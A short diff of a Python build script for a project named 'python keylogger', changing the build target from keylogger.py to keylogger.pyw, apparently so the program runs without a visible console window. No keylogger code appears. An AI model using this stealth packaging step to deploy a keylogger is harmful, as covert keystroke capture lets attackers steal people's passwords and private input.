@@ -19,5 +19,5 @@ setup(
     name = "python keylogger",
 
     # targets to build
-    console = ["keylogger.py"],
+    console = ["keylogger.pyw"],
     )
